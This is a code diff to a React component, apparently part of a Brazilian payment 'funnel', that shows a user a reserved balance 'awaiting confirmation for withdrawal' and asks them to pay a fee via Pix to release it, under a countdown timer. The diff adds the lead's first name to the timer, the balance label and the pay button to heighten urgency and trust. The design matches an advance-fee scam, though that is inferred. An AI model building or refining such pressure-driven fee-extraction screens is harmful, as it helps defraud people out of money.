@@ -64,6 +64,7 @@ const FunnelConfirmTax = ({
     return cpf;
   };
   const isUrgent = timeLeft < 120;
+  const firstName = leadName ? leadName.split(" ")[0] : "";
 
   return (
     <div className="fixed inset-0 z-[80] bg-[#F8F8F8] overflow-y-auto">
@@ -72,14 +73,14 @@ const FunnelConfirmTax = ({
       </div>
       <div className={`py-2.5 px-4 text-center transition-colors duration-300 ${isUrgent ? "bg-red-600 animate-pulse" : "bg-orange-500"}`}>
         <p className="text-white text-xs font-bold tracking-wide">
-          ⏳ Oferta expira em <span className="font-mono text-sm">{formatTime(timeLeft)}</span>
+          ⏳ {firstName ? `${firstName}, oferta` : "Oferta"} expira em <span className="font-mono text-sm">{formatTime(timeLeft)}</span>
           {isUrgent && " — Corra!"}
         </p>
       </div>
 
       <main className="px-3 py-2.5 space-y-2.5 max-w-md mx-auto pb-24">
         <div className="bg-black rounded-xl p-4">
-          <p className="text-white/90 text-[10px] font-semibold tracking-wider mb-0.5">SALDO DISPONÍVEL</p>
+          <p className="text-white/90 text-[10px] font-semibold tracking-wider mb-0.5">{firstName ? `SALDO RESERVADO PARA ${firstName.toUpperCase()}` : "SALDO DISPONÍVEL"}</p>
           <p className="text-white text-[26px] font-extrabold tracking-tight leading-none">{balance}</p>
           <p className="text-white/80 text-xs mt-1.5">Aguardando confirmação para saque</p>
         </div>
@@ -165,7 +166,7 @@ const FunnelConfirmTax = ({
           <a href="#" className="text-[#E8505B] text-xs font-medium">Precisa de ajuda?</a>
         </div>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="Pagar taxa e Liberar Saque" bgColor="bg-[#E8505B]" shadowColor="shadow-red-500/40" />
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={firstName ? `${firstName.toUpperCase()}, LIBERAR MEU SAQUE` : "Pagar taxa e Liberar Saque"} bgColor="bg-[#E8505B]" shadowColor="shadow-red-500/40" />
     </div>
   );
 };
